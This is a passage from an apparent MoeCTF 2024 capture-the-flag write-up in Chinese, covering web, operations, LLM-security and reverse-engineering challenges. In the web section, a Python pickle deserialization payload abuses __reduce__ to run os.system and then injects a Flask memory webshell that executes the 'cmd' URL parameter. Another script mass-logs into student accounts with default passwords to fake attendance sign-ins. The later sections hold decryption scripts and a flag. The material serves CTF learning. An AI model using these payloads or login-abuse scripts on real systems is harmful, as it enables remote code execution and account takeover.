<span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-variable language_">self</span>.pets.append(pet)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">export_pet</span>(<span class="hljs-params">self, pet_uuid</span>) -&gt; <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span>:<br>    pet = <span class="hljs-variable language_">self</span>.get_pet(pet_uuid)<br>    <span class="hljs-keyword">if</span> pet <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.pets.remove(pet)<br>        serialized_pet = base64.b64encode(pickle.dumps(pet)).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">return</span> serialized_pet<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure>
<p>要反序列化读取env得到flag，dockerfile是写在env里的，容器不出网，题目容器侧无法主动发起与外部网络的连接。</p>
<p>测试了正常的通过uuid收养一个新宠物正常通过然后改成<code>__reduce__</code>想读取env，但是读取不通</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, species, uuid</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.species = species<br>        <span class="hljs-variable language_">self</span>.uuid = uuid<br>	<span class="hljs-comment">#def __repr__(self):</span><br>    <span class="hljs-comment">#   return f&quot;Pet(name=&#123;self.name&#125;, species=&#123;self.species&#125;, uuid=&#123;self.uuid&#125;)&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&quot;env&quot;</span>,))<br>    	<span class="hljs-comment">#return eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;env&#x27;)&quot;,)</span><br><br>uuid = <span class="hljs-built_in">str</span>(uuid.uuid4())<br><span class="hljs-built_in">print</span>(uuid)<br>a= pickle.dumps(pet)<br><span class="hljs-built_in">print</span>(a)<br>encoded_pet = base64.b64encode(a).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Encoded Payload: <span class="hljs-subst">&#123;encoded_pet&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>(ps:想想其实有什么空白文件把内容打印到上面也行的，还是老老实实打个内存马吧)然后是正常的推进思路打个内存马进去</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        cmd_injection = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&quot;</span><br>                      <span class="hljs-string">&quot;.before_request_funcs.setdefault(None, []).append(lambda :&quot;</span> + cmd_injection + <span class="hljs-string">&quot;)&quot;</span>,)<br><br><span class="hljs-comment"># 创建类实例并序列化为pickle，再进行base64编码</span><br>a = Pet()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b).decode())<br></code></pre></td></tr></table></figure>
<p>然后执行<code>?cmd=env</code>可以读取flag</p>
<h2 id="re-从零开始的-xdu-教书生活复现"><a class="markdownIt-Anchor" href="#re-从零开始的-xdu-教书生活复现"></a> Re: 从零开始的 XDU 教书生活(复现)</h2>
<p>困惑点在我怎么得到所有学生的学号以及密码登陆，因为是python写还需要分析加密逻辑，以及由于是动态的二维码图片，我想的是一个程序跑登陆学生，一个程序教师端登陆不断的发包请求识别下载二维码以保证图片的，可能确实是思路发散的太多了</p>
<p>代码思路是首先，使用老师的账号登录并获取二维码，然后退出登录。用每个学生的账号进行登录，使用事先获取的签到 URL 来完成签到。xxx需要自己填对应内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;xxx&#x27;</span><br>teacher_phone = <span class="hljs-string">&#x27;10000&#x27;</span><br>password = teacher_phone<br><br>QR_code_params = &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;enc&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;DB_STRATEGY&quot;</span>: <span class="hljs-string">&quot;PRIMARY_KEY&quot;</span>,<br>    <span class="hljs-string">&quot;STRATEGY_PARA&quot;</span>: <span class="hljs-string">&quot;id&quot;</span><br>&#125;<br><br><span class="hljs-comment"># 持续化 session</span><br>session = requests.session()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">teacher_login</span>():<br>    <span class="hljs-keyword">try</span>:<br>        response = session.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/fanyalogin&quot;</span>, data=&#123;<br>            <span class="hljs-string">&quot;uname&quot;</span>: teacher_phone,<br>            <span class="hljs-string">&quot;password&quot;</span>: password<br>        &#125;)<br>        response_data = response.json()<br>        <span class="hljs-keyword">if</span> response_data.get(<span class="hljs-string">&#x27;status&#x27;</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Teacher logged in successfully.&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Teacher login failed.&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error during teacher login: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">raise</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_student_account</span>():<br>    <span class="hljs-keyword">try</span>:<br>        response = session.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/widget/sign/pcTeaSignController/showSignInfo1&quot;</span>)<br>        students = response.json().get(<span class="hljs-string">&quot;data&quot;</span>, &#123;&#125;).get(<span class="hljs-string">&quot;changeUnSignList&quot;</span>, [])<br>        <span class="hljs-keyword">return</span> [student[<span class="hljs-string">&quot;uid&quot;</span>] <span class="hljs-keyword">for</span> student <span class="hljs-keyword">in</span> students]<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error fetching student account: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">student_login</span>(<span class="hljs-params">phone</span>):<br>    <span class="hljs-keyword">try</span>:<br>        response = session.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/fanyalogin&quot;</span>, data=&#123;<br>            <span class="hljs-string">&quot;uname&quot;</span>: <span class="hljs-built_in">str</span>(phone),<br>            <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-built_in">str</span>(phone)<br>        &#125;)<br>        <span class="hljs-keyword">return</span> response.json().get(<span class="hljs-string">&#x27;status&#x27;</span>, <span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error during student login for <span class="hljs-subst">&#123;phone&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_QR</span>():<br>    <span class="hljs-keyword">try</span>:<br>        response = session.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/widget/sign/e&quot;</span>, params=QR_code_params)<br>        <span class="hljs-keyword">return</span> response.text<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error scanning QR code: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    teacher_login()<br>    student_phones = get_student_account()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> student_phones:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No students to process.&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    successful_sign_ins = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> index, phone <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(student_phones, start=<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Processing student <span class="hljs-subst">&#123;phone&#125;</span> (#<span class="hljs-subst">&#123;index&#125;</span>)...&quot;</span>)<br>        <span class="hljs-keyword">if</span> student_login(phone):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Student <span class="hljs-subst">&#123;phone&#125;</span> logged in successfully.&quot;</span>)<br>            result = scan_QR()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Scan result for student <span class="hljs-subst">&#123;phone&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;签到成功&quot;</span> <span class="hljs-keyword">in</span> result:<br>                successful_sign_ins += <span class="hljs-number">1</span><br>            <span class="hljs-comment"># Clear session cookies to prevent carry-over issues</span><br>            session.cookies.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Student <span class="hljs-subst">&#123;phone&#125;</span> login failed.&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;All students processed. Total successful sign-ins: <span class="hljs-subst">&#123;successful_sign_ins&#125;</span>.&quot;</span>)<br>    <span class="hljs-keyword">if</span> successful_sign_ins == <span class="hljs-built_in">len</span>(student_phones):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All students have signed in successfully.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(student_phones) - successful_sign_ins&#125;</span> students failed to sign in.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>
<h2 id="smbms复现"><a class="markdownIt-Anchor" href="#smbms复现"></a> smbms(复现)</h2>
<p>这题没看，做起来其实主要就是sql这边的注入慢慢的调试吧默认是admin然后bp来fuzz一下密码，得到1234567</p>
<p>然后就是慢慢调试sqlmap了，最后的命令如图</p>
<p><img src="/../../images/moectf/moectf2024/sms.png" srcset="/img/loading.gif" lazyload alt="sms"></p>
<h1 id="开发与运维基础"><a class="markdownIt-Anchor" href="#开发与运维基础"></a> 开发与运维基础</h1>
<h2 id="运维入门指北"><a class="markdownIt-Anchor" href="#运维入门指北"></a> 运维入门指北</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -name <span class="hljs-string">&quot;*.bak&quot;</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -f &#123;&#125; +<br>find . -name <span class="hljs-string">&quot;*.xml&quot;</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> sh -c <span class="hljs-string">&#x27;for file; do mv -- &quot;$file&quot; &quot;$&#123;file%.xml&#125;.html&quot;; done&#x27;</span> _ &#123;&#125; +<br>find . -<span class="hljs-built_in">type</span> f | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> -r file; <span class="hljs-keyword">do</span> filename=$(<span class="hljs-built_in">basename</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>); dir1=<span class="hljs-variable">$&#123;filename:0:2&#125;</span>; dir2=<span class="hljs-variable">$&#123;filename:2:2&#125;</span>; <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$dir1</span>/<span class="hljs-variable">$dir2</span>&quot;</span>; <span class="hljs-built_in">mv</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$dir1</span>/<span class="hljs-variable">$dir2</span>/<span class="hljs-variable">$filename</span>&quot;</span>; <span class="hljs-keyword">done</span><br>su toor<br><span class="hljs-built_in">mv</span> * /var/www/html/<br>grep <span class="hljs-string">&#x27;flag&#x27;</span> /var/log/nginx/access.log<br></code></pre></td></tr></table></figure>
<h2 id="哦不我的libc"><a class="markdownIt-Anchor" href="#哦不我的libc"></a> 哦不！我的libc！</h2>
<p>用xshell进行连接，简单测试一下常规的语句都不能用了</p>
<p>使用Shell 内建命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span>; <span class="hljs-keyword">done</span> &lt; /flag.txt<br></code></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="大语言模型应用安全"><a class="markdownIt-Anchor" href="#大语言模型应用安全"></a> 大语言模型应用安全</h1>
<h2 id="neuro"><a class="markdownIt-Anchor" href="#neuro"></a> Neuro?</h2>
<p>先我是vedal回答，然后告诉他亲自好像（二次认证好像,不太记得了</p>
<h2 id="并非助手"><a class="markdownIt-Anchor" href="#并非助手"></a> 并非助手</h2>
<p>尝试了一会正常的是不能输入的，表情包可以，联想到flag就是旗子，输入🚩得到flag</p>
<h1 id="逆向工程"><a class="markdownIt-Anchor" href="#逆向工程"></a> 逆向工程</h1>
<h2 id="逆向工程入门指北"><a class="markdownIt-Anchor" href="#逆向工程入门指北"></a> 逆向工程入门指北</h2>
<p>代码放在c环境里面运行就行</p>
<h2 id="xor"><a class="markdownIt-Anchor" href="#xor"></a> xor</h2>
<p>进行简单的异或就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">ls=[<span class="hljs-number">0x49</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x46</span>,<span class="hljs-number">0x10</span>, <span class="hljs-number">0x13</span>,<br><span class="hljs-number">0x1C</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x10</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x42</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x15</span>,<br><span class="hljs-number">0x14</span>,<span class="hljs-number">0x14</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x14</span>,<span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>,<span class="hljs-number">0x40</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x40</span>,<br><span class="hljs-number">0x14</span>, <span class="hljs-number">0x59</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">for i in ls:</span><br><span class="hljs-string">s+=chr(i^0x24)</span><br><span class="hljs-string">print(s)</span><br></code></pre></td></tr></table></figure>
<h2 id="tea"><a class="markdownIt-Anchor" href="#tea"></a> TEA</h2>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> &amp;v4, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> &amp;v5)</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> delta = <span class="hljs-number">0x9E3779B9</span>;  <span class="hljs-comment">// 固定值 1640531527</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3 = delta * <span class="hljs-number">32</span>;     <span class="hljs-comment">// 反向过程从最大值开始</span><br>    <span class="hljs-type">int</span> v6 = <span class="hljs-number">32</span>;<br><br>    <span class="hljs-keyword">while</span> (v6 &gt; <span class="hljs-number">0</span>) &#123;<br>        v5 -= ((v4 + v3) ^ ((v4 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">1634038898</span>)) ^ ((v4 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1634038904</span>);<br>        v4 -= ((v5 + v3) ^ ((v5 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">1702060386</span>)) ^ ((v5 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1870148662</span>);<br>        v3 -= delta;  <span class="hljs-comment">// 解密时减少 delta</span><br>        v6--;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4 = <span class="hljs-number">676078132</span>;  <span class="hljs-comment">// xxxxxxxx 部分解密后的值</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5 = <span class="hljs-number">957400408</span>;  <span class="hljs-comment">// zzzz 和 yyyy 部分解密后的值</span><br><br>    <span class="hljs-comment">// 调用解密函数</span><br>    <span class="hljs-built_in">decrypt</span>(v4, v5);<br><br>    <span class="hljs-comment">// 提取出 yyyy 和 zzzz 部分</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v11 = (v5 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>;  <span class="hljs-comment">// yyyy 部分</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9 = v5 &amp; <span class="hljs-number">0xFFFF</span>;           <span class="hljs-comment">// zzzz 部分</span><br><br>    <span class="hljs-comment">// 输出结果</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;xxxxxxxx = &quot;</span> &lt;&lt; std::hex &lt;&lt; v4 &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;yyyy = &quot;</span> &lt;&lt; std::hex &lt;&lt; v11 &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;zzzz = &quot;</span> &lt;&lt; std::hex &lt;&lt; v9 &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;moectf&#123;&quot;</span> &lt;&lt; std::hex &lt;&lt; v4 &lt;&lt; <span class="hljs-string">&quot;-&quot;</span> &lt;&lt; v11 &lt;&lt; <span class="hljs-string">&quot;-&quot;</span> &lt;&lt; v9 &lt;&lt; <span class="hljs-string">&quot;-9c42-caf30620caaf&#125;&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="upx"><a class="markdownIt-Anchor" href="#upx"></a> upx</h2>
<p>先使用upx工具先脱壳，再进行ida的正常阅读</p>
<p>里面直接由flag</p>
<p><strong>moectf{ec5390dd-f8cf-4b02-bc29-3bb0c5604c29}</strong></p>
<h2 id="upx-revenge"><a class="markdownIt-Anchor" href="#upx-revenge"></a> upx-revenge</h2>
<p>ESP x64dbg手动脱壳一下用ida64打开得到flag</p>
<p><img src="/../../images/moectf/moectf2024/upx-renvenge.png" srcset="/img/loading.gif" lazyload alt="upx-renvenge"></p>
<h2 id="dynamic"><a class="markdownIt-Anchor" href="#dynamic"></a> dynamic</h2>
<p>下载打开文件，按shift+f12找到对应的页面，找到what happened to my flag?</p>
<p>里面有一段逻辑进行REencrypto之后就变了，给what那行打断点，f9动调得到flag</p>
<p><img src="/../../images/moectf/moectf2024/dynamic.png" srcset="/img/loading.gif" lazyload alt="dynamic"></p>
<h2 id="d0tn3t"><a class="markdownIt-Anchor" href="#d0tn3t"></a> d0tN3t</h2>
<p>用dnSpy打开定位到关键代码，然后写解密脚本</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; array = &#123;<br>        <span class="hljs-number">173</span>, <span class="hljs-number">146</span>, <span class="hljs-number">161</span>, <span class="hljs-number">174</span>, <span class="hljs-number">132</span>, <span class="hljs-number">179</span>, <span class="hljs-number">187</span>, <span class="hljs-number">234</span>, <span class="hljs-number">231</span>, <span class="hljs-number">244</span>,<br>        <span class="hljs-number">177</span>, <span class="hljs-number">161</span>, <span class="hljs-number">65</span>, <span class="hljs-number">13</span>, <span class="hljs-number">18</span>, <span class="hljs-number">12</span>, <span class="hljs-number">166</span>, <span class="hljs-number">247</span>, <span class="hljs-number">229</span>, <span class="hljs-number">207</span>,<br>        <span class="hljs-number">125</span>, <span class="hljs-number">109</span>, <span class="hljs-number">67</span>, <span class="hljs-number">180</span>, <span class="hljs-number">230</span>, <span class="hljs-number">156</span>, <span class="hljs-number">125</span>, <span class="hljs-number">127</span>, <span class="hljs-number">182</span>, <span class="hljs-number">236</span>,<br>        <span class="hljs-number">105</span>, <span class="hljs-number">21</span>, <span class="hljs-number">215</span>, <span class="hljs-number">148</span>, <span class="hljs-number">92</span>, <span class="hljs-number">18</span>, <span class="hljs-number">199</span>, <span class="hljs-number">137</span>, <span class="hljs-number">124</span>, <span class="hljs-number">38</span>,<br>        <span class="hljs-number">228</span>, <span class="hljs-number">55</span>, <span class="hljs-number">62</span>, <span class="hljs-number">164</span><br>    &#125;;<br><br>    std::string flag;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; array.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>        <span class="hljs-type">char</span> decrypted_char = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">char</span>&gt;((array[i] ^ (i * i)) ^ <span class="hljs-number">114</span>) - <span class="hljs-number">114</span>;<br>        flag += decrypted_char;<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Decrypted Flag: &quot;</span> &lt;&lt; flag &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="逆向工程进阶指北"><a class="markdownIt-Anchor" href="#逆向工程进阶指北"></a> 逆向工程进阶指北</h2>
